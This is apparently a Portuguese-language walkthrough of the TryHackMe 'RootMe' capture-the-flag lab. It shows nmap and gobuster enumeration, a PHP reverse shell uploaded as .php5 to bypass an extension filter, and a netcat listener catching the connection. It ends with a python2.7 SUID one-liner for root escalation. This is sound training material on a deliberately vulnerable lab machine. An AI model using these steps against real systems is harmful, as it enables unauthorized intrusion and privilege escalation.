---
title: "Try Hack Me - RootMe"
published: 2025-09-04
description: "Walkthrough da máquina RootMe do TryHackMe, abordando upload de shell reverso e escalação de privilégios via SUID em Python."
image: "https://miro.medium.com/v2/resize:fit:1400/1*v4fQ-6MCLLiNPc_aNWwf6w.png"
tags: ["tryhackme", "ctf", "walkthrough", "nmap", "gobuster", "reverseshell", "privesc", "suid"]
category: "TryHackMe"
draft: false
---

# Try Hack Me - RootMe

:::note
**Resumo da Máquina**
- **IP:** `10.10.2.78`
- **SO:** Ubuntu Linux
- **Vetor de Ataque:** Upload de shell reverso PHP, escalação de privilégios via SUID em Python 2.7.
:::

**Tags:** `#ctf` `#walkthrough` `#nmap` `#gobuster` `#reverseshell` `#privesc` `#suid`

## 1. Reconhecimento e Enumeração

O primeiro passo foi escanear a máquina alvo para identificar portas abertas e os serviços em execução.

### 1.1. Varredura com Nmap
Usei o Nmap com o script `-sV` para detectar as versões dos serviços.

```bash
nmap -sV 10.10.2.78
```

**Resultado:**
```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 19:18 -03
Nmap scan report for 10.10.2.78
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

:::tip
**Pontos de Interesse Encontrados:**
- **Porta 22:** SSH (`OpenSSH 8.2p1`)
- **Porta 80:** HTTP (`Apache httpd 2.4.41`)
:::

### 1.2. Enumeração de Diretórios Web
Com um servidor web ativo, o próximo passo foi procurar por diretórios e arquivos ocultos usando o **GoBuster**.

```bash
gobuster dir -u http://10.10.2.78/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado:**
```text
/uploads              (Status: 301) [Size: 310] [--> http://10.10.2.78/uploads/]
/css                  (Status: 301) [Size: 306] [--> http://10.10.2.78/css/]
/js                   (Status: 301) [Size: 305] [--> http://10.10.2.78/js/]
/panel                (Status: 301) [Size: 308] [--> http://10.10.2.78/panel/]
```

O diretório `/panel/` parece ser o mais promissor para investigação.

## 2. Acesso Inicial (Shell Reverso)

Ao investigar o diretório `/panel/`, encontrei um formulário de upload. A estratégia foi enviar um shell reverso em PHP para ganhar acesso à máquina.

### 2.1. Preparando o Payload
Utilizei o conhecido script `php-reverse-shell` do Pentestmonkey.

:::warning
**Modificação Necessária:** O servidor não executava arquivos com a extensão `.php`. Foi necessário renomear o payload para **`shell.php5`** para que o upload e a execução funcionassem.
:::

### 2.2. Execução
1. Iniciei um listener na minha máquina local com `netcat` para receber a conexão reversa:
   ```bash
   nc -lvnp 1234
   ```
2. Fiz o upload do arquivo `shell.php5` através do formulário e o acessei pelo navegador (provavelmente em `/uploads/shell.php5`).
3. O listener recebeu a conexão, concedendo um shell como o usuário `www-data`:
   ```text
   listening on [any] 1234 ...
   connect to [10.9.1.139] from (UNKNOWN) [10.10.2.78] 40272
   Linux ip-10-10-2-78 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
   22:53:43 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00
   uid=33(www-data) gid=33(www-data) groups=33(www-data)    /bin/sh: 0: can't access tty; job control turned off
   ```

### 2.3. Capturando a Flag do Usuário
Com o acesso inicial, procurei pela flag `user.txt`.

```bash
$ find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt
$ cat /var/www/user.txt
```

:::important
**user.txt:** `THM{...user_flag...}`
:::

## 3. Escalação de Privilégios

O objetivo final é obter acesso root. Para isso, procurei por vetores de escalação de privilégios, começando com binários que possuem a permissão SUID.

### 3.1. Identificando o Vetor
Usei o comando `find` para listar todos os arquivos no sistema com o bit SUID ativado.

```bash
$ find / -perm -4000 -type f 2>/dev/null
```

Um resultado se destacou:
```text
/usr/bin/python2.7
```

O binário `/usr/bin/python2.7` com permissão SUID é um vetor conhecido de escalação de privilégios.

### 3.2. Exploração com GTFOBins
O site [GTFOBins](https://gtfobins.github.io/gtfobins/python/) possui o comando exato para explorar essa vulnerabilidade e obter um shell com os privilégios do dono do arquivo (neste caso, `root`).

Executei o seguinte comando no shell `www-data`:
```bash
$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

O parâmetro `-p` no `sh` garante que o *effective user ID* seja mantido, resultando em um shell de root.

### 3.3. Capturando a Flag Root
Agora como `root`, bastou encontrar e ler a flag final.

```bash
find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
cat /root/root.txt
```

:::important
**root.txt:** `THM{...root_flag...}`
:::
